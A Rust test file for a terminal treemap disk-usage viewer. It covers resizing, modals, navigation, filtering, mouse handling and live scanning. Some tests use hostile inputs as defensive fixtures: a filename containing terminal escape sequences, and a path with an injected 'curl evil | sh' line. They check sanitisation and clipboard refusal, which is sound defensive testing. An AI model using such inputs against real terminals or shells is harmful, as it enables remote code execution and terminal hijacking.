//! Headless model tests (ports of tui_test.go, nest_test.go, live_test.go).

use super::bench::opts_for;
use super::canvas::rgb;
use super::color256::{quant16, quant256};
use super::mapview::TOP_MIN_AREA;
use super::modals::new_info_modal;
use super::model::*;
use crate::cancel::Cancel;
use crate::inventory::{category_for, ext, Kind, NodeId, Tree, FLAG_SCANNED};
use crate::scan;
use crate::textutil;
use crate::treemap::Block;
use std::sync::{Arc, RwLock};
use std::time::{Duration, Instant};

const HOSTILE: &[u8] = b"evil\x1b]0;pwned\x07\x1b[2J.iso";

fn add_file(t: &mut Tree, p: NodeId, name: &[u8], size: i64) -> NodeId {
    let id = t.add(p, name, Kind::File);
    let n = t.node_mut(id);
    (n.size, n.alloc) = (size, size);
    n.cat = category_for(&ext(name), false, false);
    id
}

fn add_dir(t: &mut Tree, p: NodeId, name: &[u8]) -> NodeId {
    let id = t.add(p, name, Kind::Dir);
    t.node_mut(id).flags |= FLAG_SCANNED;
    id
}

fn test_tree() -> Tree {
    let mut t = Tree::new(b"/srv", Kind::Dir);
    let file = |t: &mut Tree, p, name: &[u8], size| {
        let id = add_file(t, p, name, size);
        t.node_mut(id).mtime = 1_700_000_000_000_000_000;
    };
    let backups = add_dir(&mut t, 0, b"backups");
    for i in 0..40i64 {
        file(
            &mut t,
            backups,
            format!("dump-{i:02}.tar.gz").as_bytes(),
            (1 + i) << 30,
        );
    }
    let vms = add_dir(&mut t, 0, b"vms");
    file(&mut t, vms, b"ubuntu.qcow2", 86 << 30);
    file(&mut t, vms, b"win.vmdk", 40 << 30);
    let media = add_dir(&mut t, 0, b"media");
    let photos = add_dir(&mut t, media, "photos 日本語".as_bytes());
    for i in 0..300i64 {
        file(
            &mut t,
            photos,
            format!("img{i:03}.jpg").as_bytes(),
            (i + 1) << 20,
        );
    }
    file(&mut t, media, HOSTILE, 9 << 30);
    file(&mut t, media, "👨‍👩‍👧 family.mp4".as_bytes(), 12 << 30);
    let tiny = add_dir(&mut t, 0, b"tiny");
    for i in 0..2000 {
        file(&mut t, tiny, format!("f{i}").as_bytes(), 100);
    }
    file(&mut t, 0, b"README", 10);
    t.recompute();
    t.stats.complete = true;
    t
}

fn model_for(t: Tree) -> Model {
    let tr = Arc::new(RwLock::new(t));
    let mut m = Model::new(opts_for(tr.clone()), None, tr, Cancel::new());
    m.profile = Profile::TrueColor;
    m
}

fn new_test_model() -> Model {
    model_for(test_tree())
}

fn send(m: &mut Model, msgs: Vec<Msg>) {
    for msg in msgs {
        m.update(msg);
    }
}

fn key(s: &str) -> Msg {
    Msg::Key(Key::from_name(s))
}

fn size(w: i32, h: i32) -> Msg {
    Msg::Size(w, h)
}

/// Removes CSI sequences.
fn strip(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    let mut it = s.chars();
    while let Some(c) = it.next() {
        if c == '\x1b' && it.clone().next() == Some('[') {
            it.next();
            for c in it.by_ref() {
                if ('\x40'..='\x7e').contains(&c) {
                    break;
                }
            }
            continue;
        }
        out.push(c);
    }
    out
}

/// Verifies the rendered frame exactly fills w×h cells and that no filename
/// control sequence leaked through.
fn check_frame(m: &mut Model, w: i32, h: i32) -> String {
    let content = m.view().to_string();
    assert!(
        !content.contains("\x1b]") && !content.contains('\x07') && !content.contains("\x1b[2J"),
        "terminal control sequence from a filename leaked into the frame"
    );
    let lines: Vec<&str> = content.split('\n').collect();
    assert_eq!(
        lines.len() as i32,
        h,
        "{w}x{h}: frame has {} lines",
        lines.len()
    );
    for (i, l) in lines.iter().enumerate() {
        let got = textutil::width(&strip(l)) as i32;
        assert_eq!(got, w, "{w}x{h}: line {i} has width {got}: {:?}", strip(l));
    }
    strip(&content)
}

fn find(m: &Model, name: &[u8]) -> NodeId {
    let t = m.tree.read().unwrap();
    let mut found = None;
    t.walk(0, |id, n| {
        if &*n.name == name {
            found = Some(id);
        }
        true
    });
    found.expect("node not found")
}

fn find_block(bs: &[Block], id: i64) -> Block {
    bs.iter().copied().find(|b| b.id == id).unwrap_or(Block {
        id: 0,
        rect: Default::default(),
    })
}

#[test]
fn resize_transitions_preserve_state() {
    let mut m = new_test_model();
    send(&mut m, vec![size(120, 40)]);
    check_frame(&mut m, 120, 40);
    // Zoom into media and select something that is not the default.
    let media = find(&m, b"media");
    (m.sel, m.user_sel) = (media as i64, true);
    send(&mut m, vec![key("space")]);
    assert_eq!(m.zoom, media);
    check_frame(&mut m, 120, 40);
    send(&mut m, vec![key("right")]);
    let sel = m.sel;
    for (w, h) in [
        (80, 24),
        (120, 40),
        (300, 80),
        (70, 20),
        (180, 50),
        (40, 10),
        (39, 9),
        (200, 60),
    ] {
        send(&mut m, vec![size(w, h)]);
        check_frame(&mut m, w, h);
        assert_eq!(m.zoom, media, "{w}x{h}: zoom lost");
        assert!(
            m.sel == sel || is_group(m.sel),
            "{w}x{h}: selection changed from {sel} to {}",
            m.sel
        );
    }
    // The layout must be recomputed for the new geometry, not stretched.
    let l = m.tm.clone().unwrap();
    assert!(
        l.rect.w <= 200 && l.rect.h <= 60,
        "layout not recomputed for final size: {:?}",
        l.rect
    );
    let r = l.rect;
    for b in &l.blocks {
        let br = b.rect;
        assert!(
            br.x >= r.x && br.y >= r.y && br.x + br.w <= r.x + r.w && br.y + br.h <= r.y + r.h,
            "block {b:?} outside treemap {r:?}"
        );
    }
}

#[test]
fn resize_storm() {
    let mut m = new_test_model();
    let mut rnd = 1u64;
    let mut intn = |n: u64| {
        rnd = rnd
            .wrapping_mul(6364136223846793005)
            .wrapping_add(1442695040888963407);
        (rnd >> 33) % n
    };
    send(&mut m, vec![size(120, 40)]);
    m.view();
    send(&mut m, vec![key("right"), key("down")]);
    let sel = m.sel;
    for i in 0..300 {
        let (w, h) = (20 + intn(300) as i32, 5 + intn(90) as i32);
        send(&mut m, vec![size(w, h)]);
        if i % 7 == 0 {
            m.view(); // renders interleave with resizes like the real event loop
        }
    }
    send(&mut m, vec![size(150, 45)]);
    check_frame(&mut m, 150, 45);
    assert_eq!(m.sel, sel, "selection lost in resize storm");
}

#[test]
fn modal_survives_resize() {
    let mut m = new_test_model();
    send(&mut m, vec![size(120, 40), key("enter")]);
    assert_eq!(m.modals.len(), 1, "Enter should open the info modal");
    for (w, h) in [(120, 40), (60, 14), (41, 10), (300, 80), (45, 12)] {
        send(&mut m, vec![size(w, h)]);
        let out = check_frame(&mut m, w, h);
        assert!(
            out.contains("ITEM INFORMATION"),
            "{w}x{h}: modal title missing:\n{out}"
        );
        let f = &m.modals[0];
        assert!(
            f.view_h >= 1 && f.view_h <= h,
            "{w}x{h}: modal viewport {}",
            f.view_h
        );
    }
    // Scrolling in a tiny terminal must stay in range.
    send(&mut m, vec![size(45, 12)]);
    for _ in 0..100 {
        send(&mut m, vec![key("down")]);
    }
    check_frame(&mut m, 45, 12);
    let f = &m.modals[0];
    assert!(
        f.scroll >= 0 && f.scroll <= f.content_n,
        "scroll out of range: {} of {}",
        f.scroll,
        f.content_n
    );
    send(&mut m, vec![key("esc")]);
    assert!(m.modals.is_empty(), "Esc should close the modal");
}

#[test]
fn spatial_navigation_uses_geometry() {
    let mut m = new_test_model();
    send(&mut m, vec![size(160, 45)]);
    m.view();
    let blocks = m.tm.clone().unwrap().blocks.clone();
    for dir in ["right", "down", "left", "up"] {
        let before = m.sel;
        send(&mut m, vec![key(dir)]);
        m.view();
        if m.sel == before {
            continue; // edge of the map
        }
        let (a, b) = (
            find_block(&blocks, before).rect,
            find_block(&blocks, m.sel).rect,
        );
        let ok = match dir {
            "right" => b.x >= a.x + a.w,
            "left" => b.x + b.w <= a.x,
            "down" => b.y >= a.y + a.h,
            _ => b.y + b.h <= a.y,
        };
        assert!(
            ok,
            "{dir} moved to a block that is not in that direction: {a:?} -> {b:?}"
        );
    }
}

#[test]
fn zoom_breadcrumbs_and_home() {
    let mut m = new_test_model();
    send(&mut m, vec![size(100, 30)]);
    let media = find(&m, b"media");
    let photos = find(&m, "photos 日本語".as_bytes());
    (m.sel, m.user_sel) = (media as i64, true);
    send(&mut m, vec![key("space")]);
    m.sel = photos as i64;
    send(&mut m, vec![key("space")]);
    assert_eq!(m.zoom, photos, "did not zoom into photos");
    let out = check_frame(&mut m, 100, 30);
    assert!(
        out.contains("media › photos 日本語"),
        "breadcrumbs missing:\n{out}"
    );
    // Narrow terminal: breadcrumbs truncate from the left, keeping the tail.
    send(&mut m, vec![size(42, 12)]);
    let out = check_frame(&mut m, 42, 12);
    assert!(out.contains("photos"), "breadcrumb tail missing:\n{out}");
    send(&mut m, vec![key("backspace")]);
    assert!(
        m.zoom == media && m.sel == photos as i64,
        "backspace: zoom {} sel {}",
        m.zoom,
        m.sel
    );
    send(&mut m, vec![key("home")]);
    assert_eq!(m.zoom, 0, "home did not return to root");
}

#[test]
fn filter_transforms_map() {
    let mut m = new_test_model();
    send(&mut m, vec![size(120, 40), key("/")]);
    for c in "ext = gz".chars() {
        send(
            &mut m,
            vec![Msg::Key(Key {
                name: c.to_string(),
                text: c.to_string(),
                ctrl_alt: false,
            })],
        );
    }
    assert!(
        m.search.err.is_empty() && m.search.query.is_some(),
        "query not parsed: {:?}",
        m.search.err
    );
    let msgs = m.apply_filter().run_sync();
    send(&mut m, msgs);
    send(&mut m, vec![key("enter")]);
    assert!(m.search.result.is_some(), "no filter result");
    let out = check_frame(&mut m, 120, 40);
    assert!(
        !out.contains("vms/") && out.contains("backups/"),
        "filter not applied to the map:\n{out}"
    );
    assert!(out.contains("FILTER"), "filter indicator missing");
    send(&mut m, vec![key("esc")]);
    assert!(
        m.search.query.is_none() && m.search.result.is_none(),
        "Esc should clear the filter"
    );
    let out = check_frame(&mut m, 120, 40);
    assert!(
        out.contains("vms/"),
        "map not restored after clearing filter:\n{out}"
    );
}

#[test]
fn hostile_name_sanitised_in_modal() {
    let mut m = new_test_model();
    send(&mut m, vec![size(120, 40)]);
    let id = find(&m, HOSTILE);
    let t = m.tree.clone();
    let md = new_info_modal(&m, &t.read().unwrap(), id);
    m.open_modal(md);
    let out = check_frame(&mut m, 120, 40);
    assert!(
        out.contains(r"\x1b]0;pwned\x07"),
        "escaped name not shown:\n{out}"
    );
}

#[test]
fn views_render_at_many_sizes() {
    let mut m = new_test_model();
    for _ in 0..m.views.len() {
        for (w, h) in [(40, 10), (80, 24), (150, 45), (91, 22)] {
            send(&mut m, vec![size(w, h)]);
            check_frame(&mut m, w, h);
            send(&mut m, vec![key("down"), key("down")]);
            check_frame(&mut m, w, h);
        }
        send(&mut m, vec![key("tab")]);
    }
    send(&mut m, vec![key("?")]);
    send(&mut m, vec![size(60, 15)]);
    check_frame(&mut m, 60, 15);
}

#[test]
fn level_of_detail_groups_tiny_files() {
    let mut m = new_test_model();
    send(&mut m, vec![size(100, 30)]);
    let tiny = find(&m, b"tiny");
    let t = m.tree.clone();
    m.zoom_to(&t.read().unwrap(), tiny);
    m.view();
    let l = m.tm.clone().unwrap();
    assert!(
        l.blocks.len() as i32 <= 100 * 30 / TOP_MIN_AREA + 1,
        "{} blocks for 2000 equal files: LOD not applied",
        l.blocks.len()
    );
    assert!(
        l.groups.contains_key(&group_id(tiny)),
        "expected a group block for small items"
    );
}

#[test]
fn ctrl_c_quits_when_idle() {
    let mut m = new_test_model();
    send(&mut m, vec![size(80, 24)]);
    m.update(Msg::Key(Key {
        name: "ctrl+c".into(),
        text: String::new(),
        ctrl_alt: true,
    }));
    assert!(m.quit, "Ctrl+C should quit when no scan runs");
}

#[test]
fn mouse() {
    let mut m = new_test_model();
    send(&mut m, vec![size(120, 40)]);
    m.view();
    // Click the centre of a block other than the selected one.
    let target = {
        let t = m.tree.read().unwrap();
        m.tm.as_ref()
            .unwrap()
            .blocks
            .iter()
            .copied()
            .find(|b| b.id != m.sel && b.id >= 0 && t.node(b.id as NodeId).is_dir() && b.rect.w > 4)
            .unwrap()
    };
    let click = || Msg::Click {
        x: target.rect.x + target.rect.w / 2,
        y: target.rect.y + target.rect.h / 2,
        button: Button::Left,
    };
    send(&mut m, vec![click()]);
    assert_eq!(m.sel, target.id, "click selected the wrong block");
    m.view();
    send(&mut m, vec![click()]); // second click within the double-click window
    assert_eq!(m.zoom as i64, target.id, "double click should zoom");
    m.view();
    send(
        &mut m,
        vec![Msg::Wheel {
            x: 50,
            y: 20,
            up: false,
        }],
    );
    assert_eq!(m.zoom, 0, "wheel down should zoom out");
    // A modal swallows clicks; clicking outside closes it.
    send(&mut m, vec![key("?")]);
    m.view();
    send(
        &mut m,
        vec![Msg::Click {
            x: 0,
            y: 39,
            button: Button::Left,
        }],
    );
    assert!(m.modals.is_empty(), "click outside modal should close it");
}

#[test]
fn quantizers() {
    assert_eq!(quant16(rgb(10, 12, 8)), 0, "near-black should map to black");
    let n = quant16(rgb(0xe0, 0x6c, 0x75));
    assert!(n == 1 || n == 9, "red-ish mapped to {n}");
    let n = quant256(rgb(40, 48, 30));
    assert!(n >= 16, "256 quantizer used palette-dependent index {n}");
    // A dark, slightly tinted shade must land on the grey ramp or a dark
    // cube entry, not a saturated one like olive (58) or navy (17).
    assert!(
        ![58, 17, 22].contains(&n),
        "dark tint mapped to saturated {n}"
    );
}

#[test]
fn colour_depths_render_same_geometry() {
    for p in [
        Profile::TrueColor,
        Profile::Ansi256,
        Profile::Ansi,
        Profile::Ascii,
    ] {
        let mut m = new_test_model();
        m.profile = p;
        send(&mut m, vec![size(100, 30)]);
        check_frame(&mut m, 100, 30);
    }
}

// A filename with a newline would run commands when pasted into a shell.
#[test]
fn copy_refuses_control_characters() {
    let mut m = new_test_model();
    m.copy_path(b"/srv/x\ncurl evil | sh\n");
    assert!(
        m.toast.starts_with("Not copied"),
        "hostile path copied: {:?}",
        m.toast
    );
    m.copy_path(&[b"/srv/media/".as_slice(), HOSTILE].concat());
    assert!(
        m.toast.starts_with("Not copied"),
        "escape sequence copied: {:?}",
        m.toast
    );
    m.copy_path("/srv/photos 日本語/img001.jpg".as_bytes());
    assert!(
        m.toast.starts_with("Copied"),
        "plain path refused: {:?}",
        m.toast
    );
}

// ---- nest_test.go -----------------------------------------------------------

fn root_tree() -> Tree {
    let mut t = Tree::new(b"/", Kind::Dir);
    let mnt = add_dir(&mut t, 0, b"mnt");
    let raid = add_dir(&mut t, mnt, b"raid");
    let media = add_dir(&mut t, raid, b"media");
    for show in ["X-Files", "Simpsons", "Frasier"] {
        let s = add_dir(&mut t, media, show.as_bytes());
        for i in 1..=5 {
            let se = add_dir(&mut t, s, format!("S{i:02}").as_bytes());
            for e in 1..=20i64 {
                add_file(&mut t, se, format!("E{e:02}.mkv").as_bytes(), e << 28);
            }
        }
    }
    let usr = add_dir(&mut t, 0, b"usr");
    let lib = add_dir(&mut t, usr, b"lib");
    for i in 0..50i64 {
        add_file(&mut t, lib, format!("lib{i}.so").as_bytes(), (i + 1) << 22);
    }
    let v = add_dir(&mut t, 0, b"var");
    let log = add_dir(&mut t, v, b"log");
    add_file(&mut t, log, b"syslog", 2 << 30);
    t.recompute();
    t.stats.complete = true;
    t
}

// A single-child chain (mnt → raid → media) must not use up the nesting
// budget: the map at / should reach the seasons and their episodes.
#[test]
fn nesting_reaches_deep_media() {
    let mut m = model_for(root_tree());
    send(&mut m, vec![size(160, 45)]);
    let out = strip(m.view());
    assert!(
        out.contains("mnt/raid/media/") && out.contains("S01/"),
        "chain or seasons missing:\n{out}"
    );
    let t = m.tree.read().unwrap();
    let files =
        m.tm.as_ref()
            .unwrap()
            .nested
            .iter()
            .filter(|nb| nb.id >= 0 && !t.node(nb.id as NodeId).is_dir())
            .count();
    assert!(files >= 50, "only {files} episode blocks drawn");
}

// Headless, o shows the selected folder in the map instead of launching a
// file manager.
#[test]
fn reveal_headless_zooms_map() {
    std::env::set_var("DISPLAY", "");
    std::env::set_var("WAYLAND_DISPLAY", "");
    let mut m = model_for(root_tree());
    send(&mut m, vec![size(160, 45)]);
    let mnt = {
        let t = m.tree.clone();
        let g = t.read().unwrap();
        m.kids_of(&g, m.zoom).ids[0]
    };
    m.snapshot = false; // reveal is refused for snapshots
    (m.sel, m.user_sel) = (mnt as i64, true);
    send(&mut m, vec![key("o")]);
    assert_eq!(
        m.zoom,
        mnt,
        "zoom = {}, want mnt",
        m.tree.read().unwrap().path_string(m.zoom)
    );
}

// ---- live_test.go -----------------------------------------------------------

/// Renders, navigates, filters and resizes while the scanner mutates the
/// inventory, verifying the locking discipline.
#[test]
fn live_scan_rendering() {
    let root = scan::tests::TempDir::new("tui-live");
    for i in 0..30 {
        let d = root.0.join(format!("d{i:02}")).join("sub");
        std::fs::create_dir_all(&d).unwrap();
        for j in 0..40 {
            std::fs::write(
                d.join(format!("f{j}.log")),
                vec![0u8; (i + 1) * (j + 1) * 100],
            )
            .unwrap();
        }
    }
    let path = root.0.as_os_str().as_encoded_bytes().to_vec();
    let start: StartFn = Arc::new(move |c: Cancel| {
        let s = scan::start(
            &path,
            scan::Options {
                workers: 4,
                chunk_size: 3,
                ..Default::default()
            },
            c,
        )?;
        let t = s.tree.clone();
        Ok((Some(s), t))
    });
    let cancel = Cancel::new();
    let (s, tr) = start(cancel.clone()).unwrap();
    let mut opts = opts_for(tr.clone());
    opts.start = start;
    let mut m = Model::new(opts, s, tr, cancel.clone());
    let sizes = [(120, 40), (80, 24), (200, 60), (45, 12)];
    let deadline = Instant::now() + Duration::from_secs(20);
    let mut i = 0;
    loop {
        let (w, h) = sizes[i % sizes.len()];
        send(&mut m, vec![size(w, h), Msg::Tick]);
        send(&mut m, vec![key(["right", "down", "left", "up"][i % 4])]);
        if i % 5 == 0 {
            send(&mut m, vec![key("tab")]);
        }
        if i == 3 {
            m.search.ed.set("ext = log");
            let _ = m.query_changed();
            let msgs = m.apply_filter().run_sync();
            send(&mut m, msgs);
        }
        m.dirty = true;
        m.view();
        if m.scanner.as_ref().unwrap().is_done() {
            let t = m.tree.clone();
            send(&mut m, vec![Msg::ScanDone(t)]);
            m.view();
            assert!(!m.scanning, "scan should be finished");
            break;
        }
        assert!(Instant::now() < deadline, "scan did not finish");
        i += 1;
    }
    cancel.cancel();
}
